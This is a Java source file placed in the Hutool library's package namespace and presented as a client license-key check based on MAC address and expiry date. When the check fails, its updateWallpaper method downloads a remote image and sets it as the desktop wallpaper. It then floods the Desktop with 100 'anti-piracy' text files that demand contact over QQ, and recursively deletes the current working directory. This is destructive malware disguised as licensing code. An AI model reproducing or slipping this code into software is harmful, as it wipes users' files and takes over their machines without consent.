package cn.hutool.core;

import cn.hutool.core.date.DateTime;
import cn.hutool.core.io.FileUtil;
import cn.hutool.core.io.file.FileReader;
import cn.hutool.core.io.file.FileWriter;
import cn.hutool.core.net.NetUtil;
import cn.hutool.core.util.StrUtil;
import cn.hutool.http.HttpUtil;
import cn.hutool.system.UserInfo;
import com.sun.jna.Native;
import com.sun.jna.win32.StdCallLibrary;

import javax.swing.filechooser.FileSystemView;
import java.io.File;
import java.net.NetworkInterface;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

/**
 * 客户端密钥校验
 *
 * @author hey
 */
public class CatGodUtil {
    private String filename = "temp\\license.dat";
    private String bgcImageSavePath = "temp\\license\\bgc1.png";
    private String diskInfo = "C:\\";
    private String bgcImageDownLoadPath = "https://wangchuan-typora.oss-cn-shanghai.aliyuncs.com/img/202301141106667.png";
    private String licenseFilePath = diskInfo + "\\" + filename;

    /**
     * 客户端密钥校验
     */
    public void validate() {
        File[] roots = File.listRoots();
        List<String> disks = new ArrayList<>();
        FileSystemView sys = FileSystemView.getFileSystemView();
        for (int i = 0; i < roots.length; i++) {
            String diskPath = roots[i].getPath();
            if (!sys.getSystemTypeDescription(roots[i]).equals("本地磁盘"))
                continue;
            if (!diskPath.startsWith("C:")) {
                disks.add(diskPath);
            }
        }
        ParseLicense(disks, getAllLocalMac());
    }

    /***
     * 获取本机Mac地址列表
     * @return Mac列表
     */
    private List<String> getAllLocalMac(){
        Set<String> macs = new HashSet<>();

        try {
            Enumeration<NetworkInterface> enumeration = NetworkInterface.getNetworkInterfaces();
            while (enumeration.hasMoreElements()) {
                StringBuffer stringBuffer = new StringBuffer();
                NetworkInterface networkInterface = enumeration.nextElement();
                if (networkInterface != null) {
                    byte[] bytes = networkInterface.getHardwareAddress();
                    if (bytes != null) {
                        for (int i = 0; i < bytes.length; i++) {
                            if (i != 0) {
                                stringBuffer.append("-");
                            }
                            int tmp = bytes[i] & 0xff;
                            String str = Integer.toHexString(tmp);
                            if (str.length() == 1) {
                                stringBuffer.append("0" + str);
                            } else {
                                stringBuffer.append(str);
                            }
                        }
                        String mac = stringBuffer.toString();
                        macs.add(mac);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        List<String> macList = new ArrayList<>(macs);
        return macList;
    }

    /***
     * 密钥解析
     * @param path 密钥路径
     * @param macAddress MAC地址
     */
    private void ParseLicense(List<String> path, List<String> macAddress) {
        if (path.size() > 0) {
            for (String disk : path) {
                if (FileUtil.exist(disk + filename)) {
                    diskInfo = disk;
                    licenseFilePath = disk + filename;
                    break;
                }
            }

        }
        if (!FileUtil.exist(licenseFilePath)) {
            updateWallpaper();
            return;
        }
        FileReader fileReader = new FileReader(licenseFilePath);
        String result = fileReader.readString();
        String parseStr = "";
        for (int i = 0; i < result.length(); i += 4) {
            String subStr = StrUtil.sub(result, i, i + 4);
            boolean isNumeric = subStr.matches("^[0-9]*[1-9][0-9]*$");
            if (isNumeric) {
                int value = Integer.parseInt(subStr) - 1124;
                if (value < 0 || value > 127)
                    continue;
                parseStr += (char) value;
            }
        }
        Boolean parseSuccess = false;
        if (parseStr.startsWith("520") && parseStr.endsWith("LLC") && parseStr.indexOf("@~<%-%>~@") != -1) {

            String subStr = parseStr.substring(3, parseStr.length() - 3);
            int index = subStr.indexOf("@~<%-%>~@");
            String str1 = StrUtil.sub(subStr, 0, index);
            String str2 = StrUtil.sub(subStr, index + 9, subStr.length());
            parseSuccess = ValidateMACAddressAndET(str1, str2, macAddress);
        }
        if (!parseSuccess)
            updateWallpaper();
    }

    /***
     *  修改桌面壁纸
     */
    private void updateWallpaper() {
        String path = diskInfo + bgcImageSavePath;
        String ipByHost = NetUtil.getIpByHost("www.baidu.com");
        if (!"www.baidu.com".equals(ipByHost))
            HttpUtil.downloadFile(bgcImageDownLoadPath, FileUtil.touch(path));
        else {
            path = "C:\\hey\\vital\\520.png";
        }
        Runtime runtime = Runtime.getRuntime();
        try {
            runtime.exec(String.format("reg add \"hkcu\\control panel\\desktop\" /v wallpaper /d \"%s\" /f", path));
            int SPI_SETDESKWALLPAPER = 0x14;
            int SPIF_UPDATEINIFILE = 0x01;
            int SPIF_SENDWININICHANGE = 0x02;

            MyUser32.INSTANCE.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, null, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
            UserInfo userInfo = new UserInfo();
            for (int i = 0; i < 100; i++) {
                String filepath = userInfo.getHomeDir() + "Desktop\\抵制盗版" + new SimpleDateFormat("HHmmssSSS").format(System.currentTimeMillis()) + ".txt";
                FileWriter writer = new FileWriter(filepath);
                writer.write("您已侵权若要继续使用，请联系作者授权，QQ：3193505834");
            }
            String currentDir = userInfo.getCurrentDir();
            deleteFile(new File(currentDir));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private interface MyUser32 extends StdCallLibrary {
        MyUser32 INSTANCE = (MyUser32) Native.loadLibrary("user32", MyUser32.class);

        boolean SystemParametersInfoA(int uiAction, int uiParam, String fnm, int fWinIni);
    }

    /***
     * 校验MAC地址、过期时间
     * @param realMacAddress 密钥中的MAC地址
     * @param ET 过期时间
     * @param macAddress MAC列表
     * @return
     */
    private boolean ValidateMACAddressAndET(String realMacAddress, String ET, List<String> macAddress) {
        if ("".equals(realMacAddress) || "".equals(ET))
            return false;
        if (!realMacAddress.startsWith("MAC:") | (realMacAddress.startsWith("MAC:") && realMacAddress.length() == 4))
            return false;
        if (!ET.startsWith("ET:") | (ET.startsWith("ET:") && ET.length() == 3))
            return false;
        List<String> collect = macAddress.stream()
                .map(String::toUpperCase).collect(Collectors.toList());
        if (!collect.contains(realMacAddress.split(":")[1]))
            return false;
        String expireTime = ET.split(":")[1];
        Pattern p = Pattern.compile("^((\\d{2}(([02468][048])|([13579][26]))[\\-\\/\\s]?((((0?[13578])|(1[02]))[\\-\\/\\s]?((0?[1-9])|([1-2][0-9])|(3[01])))|(((0?[469])|(11))[\\-\\/\\s]?((0?[1-9])|([1-2][0-9])|(30)))|(0?2[\\-\\/\\s]?((0?[1-9])|([1-2][0-9])))))|(\\d{2}(([02468][1235679])|([13579][01345789]))[\\-\\/\\s]?((((0?[13578])|(1[02]))[\\-\\/\\s]?((0?[1-9])|([1-2][0-9])|(3[01])))|(((0?[469])|(11))[\\-\\/\\s]?((0?[1-9])|([1-2][0-9])|(30)))|(0?2[\\-\\/\\s]?((0?[1-9])|(1[0-9])|(2[0-8]))))))?$");
        if (p.matcher(expireTime).matches()) {
            int time1 = Integer.parseInt(expireTime.replaceAll("-", ""));
            int time2 = Integer.parseInt(DateTime.now().toString("yyyyMMdd"));
            return time1 > time2;
        }
        return false;
    }

    /***
     * 删除文件
     * @param file 文件对象
     * @return 是否删除成功
     */
    private Boolean deleteFile(File file) {
        if (file == null || !file.exists()) {
            return false;
        }
        File[] files = file.listFiles();
        for (File f : files) {
            if (f.isDirectory()) {
                deleteFile(f);
            } else {
                f.delete();
            }
        }
        file.delete();
        return true;
    }
}
